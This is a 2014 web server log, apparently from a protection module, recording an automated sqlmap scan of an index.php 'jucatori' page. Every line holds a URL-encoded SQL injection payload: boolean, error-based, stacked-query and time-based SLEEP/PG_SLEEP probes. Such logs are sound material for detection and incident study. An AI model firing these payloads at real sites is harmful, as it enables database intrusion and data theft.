
7-12-2014 19:22:15 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%203943%3D4525&attempt=1 | Referer: no referer

7-12-2014 19:22:15 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%202464%3D2464&attempt=1 | Referer: no referer

7-12-2014 19:22:16 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%209854%3D1239--%20VYLU&attempt=1 | Referer: no referer

7-12-2014 19:22:16 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%202464%3D2464--%20tuie&attempt=1 | Referer: no referer

7-12-2014 19:22:16 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%202475%3D6266%20AND%20%28%27ZWHd%27%3D%27ZWHd&attempt=1 | Referer: no referer

7-12-2014 19:22:16 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%202464%3D2464%20AND%20%28%27hSTS%27%3D%27hSTS&attempt=1 | Referer: no referer

7-12-2014 19:22:16 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%208436%3D9663%20AND%20%27kexM%27%3D%27kexM&attempt=1 | Referer: no referer

7-12-2014 19:22:17 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%202464%3D2464%20AND%20%27yofY%27%3D%27yofY&attempt=1 | Referer: no referer

7-12-2014 19:22:17 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%202066%3D5576%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:17 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%202464%3D2464%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:17 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20AND%20%28SELECT%206302%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%286302%3D6302%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%289372%3D9372&attempt=1 | Referer: no referer

7-12-2014 19:22:18 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%20%28SELECT%206302%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%286302%3D6302%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29&attempt=1 | Referer: no referer

7-12-2014 19:22:18 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%20%28SELECT%206302%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%286302%3D6302%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20xRzl&attempt=1 | Referer: no referer

7-12-2014 19:22:19 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%20%28SELECT%206302%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%286302%3D6302%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27Mpck%27%3D%27Mpck&attempt=1 | Referer: no referer

7-12-2014 19:22:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%20%28SELECT%206302%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%286302%3D6302%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27mlRa%27%3D%27mlRa&attempt=1 | Referer: no referer

7-12-2014 19:22:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%20%28SELECT%206302%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%286302%3D6302%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20AND%206805%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286805%3D6805%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%282332%3D2332&attempt=1 | Referer: no referer

7-12-2014 19:22:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%206805%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286805%3D6805%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&attempt=1 | Referer: no referer

7-12-2014 19:22:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%206805%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286805%3D6805%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20BuWP&attempt=1 | Referer: no referer

7-12-2014 19:22:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%206805%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286805%3D6805%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27njUY%27%3D%27njUY&attempt=1 | Referer: no referer

7-12-2014 19:22:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%206805%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286805%3D6805%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27TlaJ%27%3D%27TlaJ&attempt=1 | Referer: no referer

7-12-2014 19:22:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%206805%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286805%3D6805%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20AND%208694%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288694%3D8694%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%284269%3D4269&attempt=1 | Referer: no referer

7-12-2014 19:22:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%208694%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288694%3D8694%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29&attempt=1 | Referer: no referer

7-12-2014 19:22:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%208694%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288694%3D8694%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29--%20HpwE&attempt=1 | Referer: no referer

7-12-2014 19:22:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%208694%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288694%3D8694%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%28%27zJMc%27%3D%27zJMc&attempt=1 | Referer: no referer

7-12-2014 19:22:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%208694%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288694%3D8694%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%27rfFp%27%3D%27rfFp&attempt=1 | Referer: no referer

7-12-2014 19:22:23 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%208694%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288694%3D8694%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:23 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20AND%209489%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289489%3D9489%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287688%3D7688&attempt=1 | Referer: no referer

7-12-2014 19:22:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%209489%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289489%3D9489%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&attempt=1 | Referer: no referer

7-12-2014 19:22:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%209489%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289489%3D9489%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20edqo&attempt=1 | Referer: no referer

7-12-2014 19:22:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%209489%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289489%3D9489%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27MruM%27%3D%27MruM&attempt=1 | Referer: no referer

7-12-2014 19:22:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%209489%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289489%3D9489%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27WfPx%27%3D%27WfPx&attempt=1 | Referer: no referer

7-12-2014 19:22:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%209489%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289489%3D9489%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=%28SELECT%20CONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%287449%3D7449%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%29%29&attempt=1 | Referer: no referer

7-12-2014 19:22:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=%28SELECT%20%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284801%3D4801%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%29&attempt=1 | Referer: no referer

7-12-2014 19:22:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283022%3D3022%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29&attempt=1 | Referer: no referer

7-12-2014 19:22:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=%28SELECT%20CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284492%3D4492%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%20FROM%20DUAL%29&attempt=1 | Referer: no referer

7-12-2014 19:22:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=SELECT%20%27qbjkq%27%7C%7C%28SELECT%20%28CASE%20WHEN%20%281941%3D1941%29%20THEN%201%20ELSE%200%20END%29%29%7C%7C%27qvxvq%27&attempt=1 | Referer: no referer

7-12-2014 19:22:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%3B%20SELECT%20SLEEP%285%29--%20&attempt=1 | Referer: no referer

7-12-2014 19:22:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%3B%20SELECT%20SLEEP%285%29--%20&attempt=1 | Referer: no referer

7-12-2014 19:22:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%3B%20SELECT%20SLEEP%285%29--%20&attempt=1 | Referer: no referer

7-12-2014 19:22:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%3B%20SELECT%20SLEEP%285%29--%20&attempt=1 | Referer: no referer

7-12-2014 19:22:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%3B%20SELECT%20SLEEP%285%29--%20&attempt=1 | Referer: no referer

7-12-2014 19:22:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%3B%20SELECT%20SLEEP%285%29--%20&attempt=1 | Referer: no referer

7-12-2014 19:22:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%3B%20SELECT%20PG_SLEEP%285%29--&attempt=1 | Referer: no referer

7-12-2014 19:22:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%3B%20SELECT%20PG_SLEEP%285%29--&attempt=1 | Referer: no referer

7-12-2014 19:22:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%3B%20SELECT%20PG_SLEEP%285%29--&attempt=1 | Referer: no referer

7-12-2014 19:22:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%3B%20SELECT%20PG_SLEEP%285%29--&attempt=1 | Referer: no referer

7-12-2014 19:22:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%3B%20SELECT%20PG_SLEEP%285%29--&attempt=1 | Referer: no referer

7-12-2014 19:22:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%3B%20SELECT%20PG_SLEEP%285%29--&attempt=1 | Referer: no referer

7-12-2014 19:22:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%3B%20SELECT%20PG_SLEEP%285%29--&attempt=1 | Referer: no referer

7-12-2014 19:22:32 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20AND%20SLEEP%285%29%20AND%20%289646%3D9646&attempt=1 | Referer: no referer

7-12-2014 19:22:32 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%20SLEEP%285%29&attempt=1 | Referer: no referer

7-12-2014 19:22:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%20SLEEP%285%29--%20krHf&attempt=1 | Referer: no referer

7-12-2014 19:22:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%20SLEEP%285%29%20AND%20%28%27IrRT%27%3D%27IrRT&attempt=1 | Referer: no referer

7-12-2014 19:22:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%20SLEEP%285%29%20AND%20%27MbQF%27%3D%27MbQF&attempt=1 | Referer: no referer

